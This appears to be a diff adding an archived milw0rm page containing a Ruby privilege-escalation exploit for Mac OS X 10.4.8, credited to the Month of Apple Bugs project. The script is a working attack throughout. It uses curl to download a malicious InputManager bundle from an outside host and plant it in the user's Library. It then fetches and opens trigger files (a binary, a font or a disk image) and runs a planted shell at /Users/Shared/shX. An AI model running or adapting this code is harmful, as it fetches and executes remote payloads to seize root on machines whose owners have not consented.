@@ -1,0 +1,44 @@
+<html><head><title>Mac OS X 10.4.8 (UserNotificationCenter) Privilege Escalation Exploit</title></head><pre>#!/usr/bin/ruby
+# Copyright (c) 2007 Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
+#                    Lance M. Havok   &lt;lmh [at] info-pull.com&gt;
+# All pwnage reserved.
+#
+# &quot;Exploit&quot; for MOAB-22-01-2007: All your crash are belong to us.
+#
+
+require 'fileutils'
+
+bugselected = (ARGV[0] || 0).to_i
+
+# INPUTMANAGER_URL    = &quot;http://projects.info-pull.com/moab/bug-files/MOAB-22-01-2007_im.tar.gz&quot;
+# keeping a local backup. /str0ke
+INPUTMANAGER_URL    = &quot;http://www.milw0rm.com/sploits/MOAB-22-01-2007_im.tar.gz&quot;
+INPUTMANAGER_PLANT  = &quot;/usr/bin/curl -o /tmp/moab_im.tar.gz #{INPUTMANAGER_URL};&quot;             +
+                      &quot;mkdir -p ~/Library/InputManagers/;&quot;                                    +
+                      &quot;cd ~/Library/InputManagers/;&quot;                                          +
+                      &quot;tar -zxvf /tmp/moab_im.tar.gz&quot;
+
+case bugselected
+  when 0
+    target_url  = &quot;http://projects.info-pull.com/moab/bug-files/notification&quot;
+	  trigger_cmd = &quot;curl -o /tmp/notify #{target_url} ; /tmp/notify &amp;&quot;
+  when 1
+    target_url  = &quot;http://projects.info-pull.com/moab/bug-files/pwned-ex-814.ttf&quot;
+	  trigger_cmd = &quot;/usr/bin/curl -o /tmp/pwned-ex-814.ttf #{target_url}; open /tmp/pwned-ex-814.ttf&quot;
+  when 2
+    target_url  = &quot;http://projects.info-pull.com/moab/bug-files/MOAB-10-01-2007.dmg.gz&quot;
+	  trigger_cmd = &quot;/usr/bin/curl -o /tmp/moab_dmg.gz #{target_url}; cd /tmp; gunzip moab_dmg.gz; open MOAB-10-01-2007.dmg&quot;	
+end
+
+CMD_LINE = &quot;#{INPUTMANAGER_PLANT} ; #{trigger_cmd}&quot;
+
+def escalate()
+  puts &quot;++ Welcome to Pwndertino...&quot;
+  system CMD_LINE
+  sleep 5
+  system &quot;/Users/Shared/shX&quot; 
+end
+
+escalate()
+
+# milw0rm.com [2007-01-23]</pre></html>
